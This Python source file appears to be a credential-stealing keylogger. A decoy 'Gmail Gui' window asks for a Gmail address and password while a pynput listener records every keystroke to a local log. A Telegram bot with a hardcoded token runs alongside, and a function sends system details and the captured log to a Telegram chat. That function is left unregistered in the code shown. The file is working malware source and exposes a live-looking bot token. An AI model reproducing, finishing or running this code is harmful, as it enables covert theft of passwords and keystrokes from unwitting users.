from datetime import time
from pynput.keyboard import Listener
import logging
from telegram.ext import Updater, CommandHandler, MessageHandler, Filters
from tkinter import *
import platform
import multiprocessing

logging.basicConfig(
    format="%(asctime)s - %(name)s - %(levelname)s - %(message)s", level=logging.INFO
)

logger = logging.getLogger(__name__)


def bait():
    t = Tk()
    t.title("Gmail Gui")
    send_email = StringVar()
    send_pass = StringVar()
    recv_email = StringVar()
    msg_body = None
    menuBar = Menu(t)
    menuBar.add_command(label="Instructions")
    menuBar.add_command(label="About")
    t.config(menu=menuBar)

    sender_email = Label(t, text="Sender Gmail ID: ")
    sender_entry = Entry(t, textvariable=send_email, bd=3)
    sender_pass = Label(t, text="Sender Gmail Pass: ")
    sender_passentry = Entry(t, show="*", textvariable=send_pass, bd=3)

    receiver_email = Label(t, text="Receiver Email: ")
    receiver_entry = Entry(t, textvariable=recv_email, bd=3)

    msg_label = Label(t, text="Message")
    # global msg_body
    msg_body = Text(t, height=5, width=15, bd=3)

    send = Button(t, text="Send", width=15, bd=3)
    cancel = Button(t, text="Cancel", width=15, bd=3)

    sender_email.grid(row=0, column=0, padx=5, pady=3)
    sender_entry.grid(row=0, column=1, padx=5, pady=3)
    sender_pass.grid(row=1, column=0, padx=5, pady=3)
    sender_passentry.grid(row=1, column=1, padx=5, pady=3)
    receiver_email.grid(row=2, column=0, padx=5, pady=3)
    receiver_entry.grid(row=2, column=1, padx=5, pady=3)
    msg_label.grid(row=3, column=0, padx=5, pady=3)
    msg_body.grid(row=3, column=1, padx=5, pady=3)
    send.grid(row=4, column=0, padx=5, pady=3)
    cancel.grid(row=4, column=1, padx=5, pady=3)
    t.mainloop()


def log_keystroke(key):
    key = str(key).replace("'", "")
    if key == "Key.space":
        key = "  "
    elif key == "Key.tab":
        key = "         "
    elif key == "Key.enter":
        key = "\n"
    key = str(key).replace("Key.", "")
    with open("log.txt", "a") as f:
        f.write(key + " ")


def keylog():
    with Listener(on_press=log_keystroke) as l:
        l.join()


def start(update, context):
    update.message.reply_text("Hi!")


def help(update, context):
    update.message.reply_text("Help!")


def echo(update, context):
    print(update.message.text)
    update.message.reply_text(update.message.text)


def bossprotocol(update):
    sys_info = platform.uname()
    update.message.reply_text(sys_info)
    f = open("log.txt", "r")
    message = f.read()
    update.message.reply_text(message)
    open("log.txt", "w")


def error(update, context):
    """Log Errors caused by Updates."""
    logger.warning('Update "%s" caused error "%s"', update, context.error)


def tele_bot():
    updater = Updater(
        "5027710057:AAGBz3kPPzovjenBTiB2_-shOutLMg0NBmI", use_context=True
    )

    dp = updater.dispatcher

    dp.add_handler(CommandHandler("start", start))
    dp.add_handler(CommandHandler("help", help))
    dp.add_handler(MessageHandler(Filters.text, echo))
    dp.add_error_handler(error)
    updater.start_polling()
    updater.idle()


if __name__ == "__main__":
    t1 = multiprocessing.Process(target=keylog)
    t2 = multiprocessing.Process(target=tele_bot)
    bait()
    t1.start()
    t2.start()
